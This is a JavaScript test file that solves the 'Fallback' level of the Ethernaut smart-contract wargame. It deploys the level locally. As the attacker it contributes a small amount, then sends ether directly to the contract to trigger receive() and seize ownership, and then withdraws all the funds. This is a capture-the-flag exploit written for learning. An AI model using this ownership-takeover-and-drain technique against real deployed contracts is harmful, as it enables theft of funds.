const FallbackFactory = artifacts.require('./levels/FallbackFactory.sol')
const Fallback = artifacts.require('./levels/Fallback.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 1 - Fallback", function () {
    let ethernaut
    let level
    let instance
    let attacker

    const initialFunds = "1000"
    const attackerContributionSize = "0.00001"

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await FallbackFactory.new()
        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Fallback
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("instance owner is the level address", async function () {
            expect(await instance.owner()).to.eq(level.address)
        })

        it("assign all funds to owner", async function () {
            const ownerContribution = await instance.contributions(level.address)
            expect(web3.utils.fromWei(ownerContribution)).to.eq(initialFunds)
        })
    })

    describe("Attack Execution", function () {
        it("change ownership to attacker", async function () {
            //Regular contribution by the attacker
            await instance.contribute({ from: attacker, value: web3.utils.toWei(attackerContributionSize) })

            const attackerContribution = await instance.getContribution({ from: attacker })
            expect(web3.utils.fromWei(attackerContribution)).to.eq(attackerContributionSize)

            /*
                Send funds directly to the contract address.
                This will trigger the receive() function to run and change the contract owner
            */
            await web3.eth.sendTransaction(
                {
                    from: attacker,
                    to: instance.address,
                    value: web3.utils.toWei(attackerContributionSize)
                }
            )

            expect(await instance.owner()).is.eq(attacker)
        })

        it("steal all funds", async function () {
            //After attacker is set as owner, they can withdraw the funds
            await instance.withdraw({ from: attacker })
            const attackerBalance = await utils.getBalance(web3, attacker)
            expect(parseInt(attackerBalance)).to.be.gt(parseInt(initialFunds))
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )
            
            expect(result).to.be.true
        })
    })
})